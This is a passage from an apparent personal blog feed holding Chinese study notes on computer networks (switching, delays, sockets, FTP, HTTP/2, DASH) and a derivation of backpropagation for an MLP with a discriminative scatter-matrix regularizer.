    <content type="html"><![CDATA[<h2 id="第一章">第一章</h2><h3 id="一些基本概念">一些基本概念</h3><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211236819148_796_20221026090215966691_917_image-20220921102100658.png" alt="image-20220921102100658"> <span class="math display">\[\frac{640*480*3}{1024}=900\text{KB}\]</span></p><h3 id="internet边缘与核心">Internet边缘与核心</h3><h4 id="电路交换">电路交换</h4><h5 id="时分和频分多路复用">时分和频分多路复用</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211237908762_469_20221026090217080225_394_image-20220921091644435.png" alt="image-20220921091644435"><figcaption aria-hidden="true">image-20220921091644435</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211239260101_820_20221026090219745396_605_image-20220914113833784.png" alt="image-20220914113833784" width="50%" height="50%"></p><h5 id="报文分组交换">报文分组交换</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211240617235_875_20221026090222052725_480_image-20220921090426643.png" alt="image-20220921090426643"><figcaption aria-hidden="true">image-20220921090426643</figcaption></figure><p>”谁来用谁,满了就丢“（当然刚满的时候有临时缓存）</p><p class="note note-secondary">由于成本问题，广域网带宽往往比局域网小得多。</p><p>问题：因为有排队现象，延迟大</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211242172177_624_20221026090236334011_832_image-20220921091804148.png" alt="image-20220921091804148"><figcaption aria-hidden="true">image-20220921091804148</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211245205712_132_20221026090239402715_311_image-20220921092457252.png" alt="image-20220921092457252"><figcaption aria-hidden="true">image-20220921092457252</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211252077183_381_20221026090242065298_766_image-20220921102342289.png" alt="image-20220921102342289"><figcaption aria-hidden="true">image-20220921102342289</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211254458093_810_20221026090244516116_167_image-20220921102115526.png" alt="image-20220921102115526"><figcaption aria-hidden="true">image-20220921102115526</figcaption></figure><p>题中是Mb不是MB。别忘了字节和bit的转换，正确答案是C。</p><h4 id="传输时延">传输时延</h4><p><font color="Apricot">别忘了RTP的定义</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211255677100_921_20221026090246765227_486_image-20221012101652816.png" alt="image-20221012101652816"><figcaption aria-hidden="true">image-20221012101652816</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211256918228_272_image-20221115202145242.png" alt="image-20221115202145242"><figcaption aria-hidden="true">image-20221115202145242</figcaption></figure><h3 id="web服务器访问示例">Web服务器访问示例</h3><p>网络体系结构概览，理解。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211258149168_184_20221026090248226957_689_image-20220921135514064.png" alt="image-20220921135514064"><figcaption aria-hidden="true">image-20220921135514064</figcaption></figure><h2 id="第二章">第二章</h2><h3 id="应用层协议和进程通信模型">应用层协议和进程通信模型</h3><h4 id="进程通信模型">进程通信模型</h4><p class="note note-primary"></p><p>进程之间如何通信？</p>1.管道 2.共享内存 3.消息队列<p></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211301020358_123_20221026090249957055_679_image-20220928093225868.png" alt="image-20220928093225868"><figcaption aria-hidden="true">image-20220928093225868</figcaption></figure><p class="note note-info">C/S模型的缺陷：如果访问量大的时候，会影响服务质量，甚至会导致中心服务器瘫痪P2P模型缺陷：不便于管理</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211306273537_209_20221026090255703101_824_image-20221012092450719.png" alt="image-20221012092450719"><figcaption aria-hidden="true">image-20221012092450719</figcaption></figure><p>D。客户机面向用户。其实主要注意C是对的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211307832872_485_20221026090257212133_865_image-20221012112533931.png" alt="image-20221012112533931"><figcaption aria-hidden="true">image-20221012112533931</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211309460198_376_20221026090258905463_489_image-20221012112556726.png" alt="image-20221012112556726"><figcaption aria-hidden="true">image-20221012112556726</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211310915799_585_20221026090300525887_688_image-20220928094631013.png" alt="image-20220928094631013"><figcaption aria-hidden="true">image-20220928094631013</figcaption></figure><h4 id="进程地址标识">进程地址标识</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211312679793_765_20221026090302563658_334_image-20220928101653200.png" alt="image-20220928101653200"><figcaption aria-hidden="true">image-20220928101653200</figcaption></figure><h4 id="应用层协议定义的内容">应用层协议定义的内容</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211314098352_565_20221026090304286709_112_image-20220928103019165.png" alt="image-20220928103019165"><figcaption aria-hidden="true">image-20220928103019165</figcaption></figure><h4 id="传输层">传输层</h4><p>作用：保证端到端服务的可靠性</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211315890938_941_20221026090306529509_443_image-20220928103725740.png" alt="image-20220928103725740"><figcaption aria-hidden="true">image-20220928103725740</figcaption></figure><p>UCP服务的不可靠是相对的，只是级别比较低。</p><p>UCP的优势：建立连接快，占用资源少，实现简单，不容易被监控</p><p class="note note-info">无论TCP还是UDP都没有提供任何加密机制，这就是说发送进程传进其套接字的数据，与经网络传送到目的进程的数据相同。因此，举例来说如果某发送进程以明文方式（即没有加密）发送了一个口令进入它的套接字，该明文口令将经过发送方与接收方之间的所有链路传送，这就可能在任何中间链路被嗅探和发现。因为隐私和其他安全问题对许多应用而言已经成为至关重要的问题，所以因特网界已经研制了TCP的加强版本，称为安全套接字层(SecureSocketsLayer，SSL)。用SSL加强后的TCP不仅能够做传统的TCP所能做的一切，而且提供了关键的进程到进程的安全性服务，包括加密、数据完整性和端点鉴别。</p><p>TCP/IP协议通常在操作系统的内核中实现</p><h4 id="socket">socket</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211317698073_125_20221026090312331202_111_image-20220928111844557.png" alt="image-20220928111844557"><figcaption aria-hidden="true">image-20220928111844557</figcaption></figure><p>TCP/UDP协议感性认识</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211319606921_893_20221026090313969554_614_image-20220928135917798.png" alt="image-20220928135917798" width="50%" height="50%"></p><h4 id="socket编程">socket编程</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211321908968_371_20221026090321048624_770_image-20221005095507884.png" alt="image-20221005095507884"><figcaption aria-hidden="true">image-20221005095507884</figcaption></figure><p>PowerPC采用大端序，其他CPU大多使用小端序。网络编程使用大端序。</p><h3 id="文件传输协议">文件传输协议</h3><p>FTP基于TCP的可靠服务</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211323746227_758_20221026090322840513_285_image-20221012093347724.png" alt="image-20221012093347724"><figcaption aria-hidden="true">image-20221012093347724</figcaption></figure><p>对应的，邮件传输是带内控制。</p><blockquote><p>FTP客户首先连接服务器的21号端口，建立控制连接（控制连接在整个会话期间一直保持打开)，然后建立数据连接，在数据传送完毕后，数据连接最先释放，控制连接最后释放。</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211325291125_471_20221026090326097608_519_image-20221012095753630.png" alt="image-20221012095753630"><figcaption aria-hidden="true">image-20221012095753630</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211327293354_420_20221026090328651614_685_image-20221012095828837.png" alt="image-20221012095828837"><figcaption aria-hidden="true">image-20221012095828837</figcaption></figure><p>D</p><p class="note note-info">为什么FTP不适合共享读写文件？因为FTP使用了一个分离的控制连接，所以也称FTP的控制信息是带外(Out-of-band)传送的？使用FTP时，若要修改服务器上的文件，则需要先将此文件传送到本地主机，然后再将修改后的文件副本传送到原服务器，来回传送耗费很多时间。网络文件系统(NFS)采用另一种思路，它允许进程打开一个远程文件，并能在该文件的某个特定位置开始读写数据。这样，NFS可使用户复制一个大文件中的一个很小的片段，而不需要复制整个大文件。</p><blockquote><p>针对文件传输FTP，系统管理员建立了一个特殊的用户ID，名为anonymous，即匿名用户。Internet上的任何人在任何地方都可以使用该用户ID，只是在要求提供用户ID时必须输入anonymous，该用户ID的密码可以是任何字符串。</p></blockquote><p class="note note-info">为什么FTP要采用两个独立的连接？在FTP的实现中，客户与服务器之间采用了两条传输连接，其中控制连接用于传输各种FTP命令，而数据连接用于文件的传送。之所以这样设计，是因为使用两条独立的连接可使FTP变得更加简单、更容易实现、更有效率。同时在文件传输过程中，还可以利用控制连接控制传输过程，如客户可以请求终止、暂停传输等。</p><h3 id="web服务和http协议">Web服务和HTTP协议</h3><h4 id="最新最热http2.0">最新最热HTTP2.0</h4><h5 id="二进制分帧传输">二进制分帧传输</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211328528137_956_20221026090330394790_595_image-20221012105830716.png" alt="image-20221012105830716"><figcaption aria-hidden="true">image-20221012105830716</figcaption></figure><h5 id="tcp连接复用">TCP连接复用</h5><p>虽然想法很朴素，但确解决了为追求简单和仅适应文本传输的历史遗留问题</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211333340697_530_20221026090332798519_644_image-20221012110140184.png" alt="image-20221012110140184"><figcaption aria-hidden="true">image-20221012110140184</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211334737243_297_20221026090334780017_529_image-20221012110329212.png" alt="image-20221012110329212"><figcaption aria-hidden="true">image-20221012110329212</figcaption></figure><h5 id="服务器推送和http头压缩">服务器推送和HTTP头压缩</h5><p>当然服务器推送也增加了服务器的压力，因为之前服务器并不需要关注传输的是什么内容</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211336812610_639_20221026090336747509_846_image-20221012110625529.png" alt="image-20221012110625529"><figcaption aria-hidden="true">image-20221012110625529</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211337992835_205_20221026090338868210_673_image-20221012111205235.png" alt="image-20221012111205235"><figcaption aria-hidden="true">image-20221012111205235</figcaption></figure><h4 id="cdn">CDN</h4><h4 id="dash">DASH</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211339309558_325_20221026090340524655_762_image-20221019092551081.png" alt="image-20221019092551081"><figcaption aria-hidden="true">image-20221019092551081</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211341451867_907_20221026090342143506_385_image-20221019092718918.png" alt="image-20221019092718918"><figcaption aria-hidden="true">image-20221019092718918</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E5%BA%94%E7%94%A8%E5%B1%82/20230828211342854815_392_20221026090343857447_572_image-20221019092804145.png" alt="image-20221019092804145"><figcaption aria-hidden="true">image-20221019092804145</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MLP_BP反向传播</title>
    <link href="/posts/43013/"/>
    <url>/posts/43013/</url>
    
    <content type="html"><![CDATA[<h1 id="mlp_bp反向传播">MLP_BP反向传播</h1><h2 id="实验要求">实验要求</h2><p>以三层感知机为例，使用反向传播算法更新MLP的权重和偏置项。</p><p>Define <span class="math inline">\(S_w\)</span> and <span class="math inline">\(S_b\)</span> as: <span class="math display">\[\begin{aligned}&amp;S_w=\sum_{c=1}^C \sum_{\boldsymbol{y}_i^M \inc}\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)^T\\&amp;S_b=\sum_{c=1}^Cn_c\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)^T\end{aligned}\]</span> where <span class="math inline">\(m_c^M\)</span> is the meanvector of <span class="math inline">\(\boldsymbol{y}_i^M\)</span> (theoutput of the <span class="math inline">\(i\)</span> th sample from thecth class), <span class="math inline">\(\boldsymbol{m}^M\)</span> is themean vector of the output <span class="math inline">\(\boldsymbol{y}_i^M\)</span> from all classes,<span class="math inline">\(n_c\)</span> is the number of samples fromthe cth class. Define the discriminative regularization term <span class="math inline">\(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\)</span>and incorporate it into the objective function of the MLP: <span class="math display">\[E=\sum_i \sum_j \frac{1}{2}\left(\boldsymbol{y}_{i,j}^M-\boldsymbol{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\right).\]</span></p><h2 id="符号说明">符号说明</h2><p>以经典的手写体识别任务为例，说明本次实验推导所用符号的含义：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210815136024_245_20221231171137685205_418_image-20221231170939828.png"></p><p>其中<span class="math inline">\(\sigma\)</span>为激活函数，此处使用sigmoid函数即</p><p><span class="math display">\[\sigma(x)=\frac{1}{1+e^{-x}}\]</span> 导函数为 <span class="math display">\[\sigma^{\prime}(x)=\sigma(x)(1-\sigma(x))\]</span></p><h2 id="对正则项的理解">对正则项的理解</h2><p>首先我们看到，这个题目中的正则项不同于常见的L1正则项或者L2正则项。那么它代表什么含义，又是怎么起到正则化的作用的呢？</p><p>在了解了线性判别分析之后，发现这个正则项与线性判别分析中所谓的”类内散度矩阵“和”类问散度矩阵"非常相似。而线性判别分析的核心思想便是”类内方差小、类间间隔大“，在这里也是如此。<span class="math display">\[\begin{aligned}&amp;S_w=\sum_{c=1}^C \sum_{\boldsymbol{y}_i^M \inc}\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)\left(\boldsymbol{y}_i^M-\boldsymbol{m}_c^M\right)^T\\&amp;S_b=\sum_{c=1}^Cn_c\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)\left(\boldsymbol{m}_c^M-\boldsymbol{m}^M\right)^T\end{aligned}\]</span> <span class="math display">\[E=\sum_i \sum_j \frac{1}{2}\left(\boldsymbol{y}_{i,j}^M-\boldsymbol{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left(\operatorname{tr}\left(S_w\right)-\operatorname{tr}\left(S_b\right)\right).\]</span></p><p>从损失函数可以看出，，我们希望让类内散度矩阵<span class="math inline">\(S_w\)</span>尽可能小，即同一类的样本尽量预测结果一致；同时<span class="math inline">\(S_b\)</span>是类间散度矩阵，我们希望让它尽可能大，以让模型更好的”区别“开不同的样本。</p><p>为了下面分析的方便，对损失函数进行拆解。</p><p>容易证明，对于两个阶数都是 <span class="math inline">\(m \timesn\)</span> 的矩阵 <span class="math inline">\(\boldsymbol{A}_{m \timesn}, \boldsymbol{B}_{m \times n}\)</span>, 其中一个矩阵乘以另一个矩阵的转置的迹, 本质是 <span class="math inline">\(\boldsymbol{A}_{m \times n}, \boldsymbol{B}_{m\times n}\)</span> 两个矩阵对应位置的元素相乘并相加,可以理解为向量的点积在矩阵上的推广, 即: <span class="math display">\[\begin{aligned}\operatorname{tr}\left(\boldsymbol{A} \boldsymbol{B}^T\right)&amp;=a_{11} b_{11}+a_{12} b_{12}+\cdots+a_{1 n} b_{1 n} \\&amp;+a_{21} b_{21}+a_{22} b_{22}+\cdots+a_{2 n} b_{2 n} \\&amp;+\cdots \\&amp;+a_{m 1} b_{m 1}+a_{m 2} b_{m 2}+\cdots+a_{m n} b_{m n}\end{aligned}\]</span>则对于题中的列向量也是如此，在损失函数中表现为各元素的平方和。</p><p>由此可以得到单个样本单个特征的损失函数: <span class="math display">\[E_{ij}=\frac{1}{2}\left({y}_{i, j}-{d}_{i, j}\right)^2+\frac{1}{2}\gamma\left[\left({y}_{i,j}-{m}_{c,j}\right)^2-\left({m}_{c,j}-m_j\right)^2\right]\]</span></p><p>对此公式符号的含义进行如下直观解释:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210816459308_622_20221124231357983833_279_image-20221124230019479.png" alt="image-20221124230019479"><figcaption aria-hidden="true">image-20221124230019479</figcaption></figure><p>注：上图所指<span class="math inline">\(j\)</span>也为<span class="math inline">\(3\)</span>；<span class="math inline">\(m_j\)</span>表示第<span class="math inline">\(j\)</span>类上的预测值在所有样本上的平均。 ##梯度下降求解</p><h3 id="目标">目标</h3><p>首先我们需要清楚反向传播的目的：我们希望根据模型在样本上的表现结果调节模型，最小化损失函数以让其在训练集上的表现更好。</p><p>具体到神经网络，我们需要调节的是每一条边对应的权重或偏置，依据是损失函数对该层权重的偏导。直观一点说，偏导反映的是参数的微小变化对损失的影响。我们希望最小化损失函数，那么比如如果求出来对权重的偏导是正的，那么说明损失函数随权重增大而增大，那么就要让权重变小一点。</p><p>因此我们更新参数的方式如下： <span class="math display">\[\begin{aligned} W^{(l)} &amp;=W^{(l)}-\frac{\alpha}{d }\frac{\partialE}{\partial W^{(l)}}\\ \boldsymbol b^{(l)} &amp;=\boldsymbolb^{(l)}-\frac{\alpha}{d}\frac{\partial E}{\partial b^{(l)}}\end{aligned}\tag{1}\]</span> 其中<span class="math inline">\(l\)</span>是权重和偏置所在的层数，对于三层感知机<span class="math inline">\(l=1,2\)</span>。<span class="math inline">\(\alpha\)</span>为学习率。 <span class="math inline">\(d\)</span>为整个训练集大小，比如对于MNIST这个值为60000。</p><h3 id="偏导求解">偏导求解</h3><p>在上面定义了对于单个样本单个特征的损失函数。下面为简化叙述，采用逐样本进行偏导的求解。根据题目的含义我们应该是使用<strong>批量梯度下降法</strong>进行更新，此时将对每个样本求得的偏导加起来求得总的<span class="math inline">\(E\)</span>代入<span class="math inline">\((1)\)</span>中（而不是每个样本都使用<span class="math inline">\((1)\)</span>式进行更新）即可。</p><p>也就是 <span class="math display">\[E_i=\sum_{j=1}^{c} E_{ij}\\E=\sum_{i=1}^{d} E_{i}\]</span></p><p><span class="math inline">\(c\)</span>为类的个数，比如手写体识别中为10，数字<span class="math inline">\(j\)</span>对应于类<span class="math inline">\(j+1\)</span>。</p><p>阅读下面的求解过程时如果担心忘记符号对应的含义，可以将下图固定在屏幕上。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/MLP_BP%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/20230828210815136024_245_20221231171137685205_418_image-20221231170939828.png"></p><h4 id="最后一层">最后一层</h4><p>从总体来看，对于最后一层的某个边<span class="math inline">\(w_{jk}\)</span>的权重更新是比较容易进行的。如图所示，<span class="math inline">\(j=1,2...c\)</span>，<span class="math inline">\(c\)</span>为类别的个数。<span class="math inline">\(k=1,2...h\)</span>，<span class="math inline">\(h\)</span>为隐层包含的神经元个数。</p><p>由链式法则，有：</p><p><span class="math display">\[\frac{\partial E_i}{\partial w_{jk}}=\frac{\partial z_{i,j}}{\partial w_{jk}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\]</span>由于符号定义中第三层的神经元能够比较好的和第二层的区别开，故省略了表示层数的上标；而<span class="math inline">\(z\)</span>和<span class="math inline">\(a\)</span>的取值与均与特定的样本有关，故都保留了表示样本的下角标<span class="math inline">\(i\)</span>。</p><p>我们仍旧可以直观的理解链式法则对应于参数更新的含义。我们要求的是损失函数<span class="math inline">\(E_i\)</span>对<span class="math inline">\(w_{jk}\)</span>的敏感程度，而<span class="math inline">\(w_{jk}\)</span>能够直接影响的是<span class="math inline">\(z_{ij}\)</span>，<span class="math inline">\(z_{i,j}\)</span>影响<span class="math inline">\(y_{ij}\)</span>，<span class="math inline">\(y_{i,j}\)</span>才直接影响到损失函数。因此需要借助链式法则将这个”影响链“串起来。</p><p><span class="math inline">\(z_{i,j}\)</span>取决于第二层所有神经元，但我们只需要关注与正在求偏导的边相关的节点：<span class="math display">\[z_{i,j}=\cdots+w_{j k} a_k+\cdots\]</span> 故有 <span class="math display">\[\frac{\partial z_{i,j}}{\partial w_{jk}}=a_{i,k}\]</span> <span class="math inline">\(y_{i,j}=\sigma\left(z_{ij}\right)\)</span>，因此<span class="math inline">\(\frac{\partial y_{i,j}}{\partial z_{i,j}}\)</span> 就等于激活函数的导数，即<span class="math inline">\({\sigma}’\left(z_{i,j}\right)\)</span>。重点是最后一项：<span class="math display">\[\frac{\partial E_i}{\partial y_{i,j}}=\frac{\partial{(\sum_{p=1}^{c}}E_{ip})}{\partial y_{i,j}}\]</span> 而 <span class="math display">\[E_{ip}=\frac{1}{2}\left({y}_{i,p}-{d}_{i, p}\right)^2+\frac{1}{2}\gamma\left[\left({y}_{i,p}-{m}_{c,p}\right)^2-\left({m}_{c,p}-m_p\right)^2\right]\]</span> <span class="math inline">\(E_{ip}\)</span>中包含<span class="math inline">\(E_{ij}\)</span>，而且我们只关心<span class="math inline">\(E_{ij}\)</span>。<span class="math inline">\(E_{ij}\)</span>里面自然有一个<span class="math inline">\(y_{ij}\)</span>。不仅如此，别忘了<span class="math inline">\({m}_{c,j}\)</span>和<span class="math inline">\(m_j\)</span>也都是与<span class="math inline">\(y_{ij}\)</span>相关的变量，比如 <span class="math display">\[{m}_{c,j}=\frac{1}{n_c}\sum_{N=1}^{n_c}{y}_{N,j}\]</span> <span class="math inline">\(c_N\)</span>是这个样本所属的类在训练集中的数目，比如这个样本实际上是个"3"，那么<span class="math inline">\(c_N\)</span>就是训练集中"3"的数目。</p><p><span class="math inline">\({y}_{i, j}\)</span>自然对应<span class="math inline">\({y}_{N, j}\)</span>中的某一个。因此 <span class="math display">\[\frac{\partial {m}_{c,j}}{\partial y_{ij}}=\frac{1}{n_c}\]</span></p><p>同样的， <span class="math display">\[{m}_{j}=\frac{1}{d}\sum_{N=1}^{d}{y}_{N, j}\\\frac{\partial {m}_{j}}{\partial y_{ij}}=\frac{1}{d}\]</span> <span class="math inline">\(d\)</span>是训练集中样本数目。</p><p>由此我们可以继续求解：</p><p><span class="math display">\[\begin{align}\frac{\partial E_i}{\partialy_{i,j}}&amp;=\frac{\partial{(\sum_{p=1}^{c} }E_{ip})}{\partialy_{ij}}=\frac{\partial{E_{ij} }}{\partial y_{ij}}\\&amp;={y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]    \end{align}\]</span></p><p>将上面求得的结果代入对<span class="math inline">\(w_{jk}\)</span>求偏导的式子中： <span class="math display">\[\begin{align}\frac{\partial E_i}{\partial w_{jk}}&amp;=\frac{\partial z_{i,j}}{\partial w_{jk}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\\&amp;=a_{i,k}\;{\sigma}’\left(z_{i,j}\right)\;\left \{ {y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]\right\}    \end{align}\]</span>最后，如果我们想要进行批量梯度下降，需要将所有训练集中样本的损失函数加起来求平均，进行一次更新：<span class="math display">\[\begin{align}\frac{\partial E}{\partial w_{jk}}&amp;=\sum_{i=1}^{d}\frac{\partial E_i}{\partial w_{jk}}\\&amp;=\sum_{i=1}^{d}a_{i,k}\;{\sigma}’\left(z_{i，j}\right)\;\left \{{y}_{i,j}-{d}_{i,j}+\gamma\left[(y_{ij}-m_{c,j})(1-\frac{1}{n_c})-(m_{cj}-m_{j})(\frac{1}{n_c}-\frac{1}{d})\right]\right\}    \end{align}\]</span> 由于三个部分均与<span class="math inline">\(i\)</span>有关，所以没有可以提取的公因子，需要逐项累加。并且该式子与第<span class="math inline">\(i\)</span>个样本所属类有关，因此也要根据样本情况代入相应的的<span class="math inline">\(n_c\)</span>和</p><p><span class="math inline">\(m_{c,j}\)</span>。</p><p>此时我们就可以代入<span class="math inline">\((1)\)</span>式(更新参数的方式)中，进行每条权重边的更新了。</p><p>对于最后一层的<span class="math inline">\(b_j\)</span>对应偏置的边求解的方式和<span class="math inline">\(w_{jk}\)</span>类似。 <span class="math display">\[\frac{\partial E_i}{\partial b_{j}}=\frac{\partial z_{i,j}}{\partial b_{j}}\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\]</span> <span class="math inline">\(\frac{\partial z_{i,j}}{\partialb_{j}}=b^{(2)}\)</span>，<span class="math inline">\(\frac{\partialy_{i,j}}{\partial z_{i,j}}\)</span>和<span class="math inline">\(\frac{\partial E_i}{\partialy_{i,j}}\)</span>已经求得，代入即可。</p><h4 id="倒数第二层">倒数第二层</h4><p>倒数第二层某一条权重边记为<span class="math inline">\(w_{kn}\)</span>。 <span class="math display">\[\frac{\partial E_i}{\partial w_{kn}}=\frac{\partial z_{i,k}}{\partial w_{kn}}\frac{\partial a_{i,k}}{\partial z_{i,k}}\frac{\partial E_i}{\partial a_{i,k}}\]</span></p><p>重点是<span class="math inline">\(\frac{\partial E_i}{\partiala_{i,k}}\)</span>。它通过影响最后一层的所有节点去影响最终的损失函数。<span class="math display">\[\frac{\partial E_i}{\partial a_{i,k}}=\underbrace{\sum_{p=1}^{c}\frac{\partial z_{i,j}}{\partial a_{i,k}} \frac{\partialy_{i,j}}{\partial z_{i,j}} \frac{\partial E_i}{\partial y_{i,j}}}_{\text{Sum over the output layer }}\]</span> 不同于<span class="math inline">\(z_{i,k}\)</span>，<span class="math inline">\(z_{i,j}\)</span>自然是指最后一层的线性变换。</p><p><span class="math inline">\(\frac{\partial y_{i,j}}{\partial z_{i,j}}\frac{\partial E_i}{\partial y_{i,j}}\)</span>我们前面已经求得了。<span class="math inline">\(\frac{\partial z_{i,j}}{\partiala_{i,k}}=w_{jk}\)</span>。</p><p>根据递推关系其实也没有很复杂。</p><p>前面两项非常容易求得： <span class="math display">\[\frac{\partial a_{i,k}}{\partial z_{i,k}}=\sigma’\left(z_{i,k}\right)\\\frac{\partial z_{i,k}}{\partial w_{kn}}=x_{i,n}\]</span></p><p>同样的，各个样本上的偏导累加并求平均，然后设置学习率进行梯度下降更新参数即可。<span class="math display">\[\frac{\partial E_i}{\partial b_{k}}=\frac{\partial z_{i,k}}{\partial 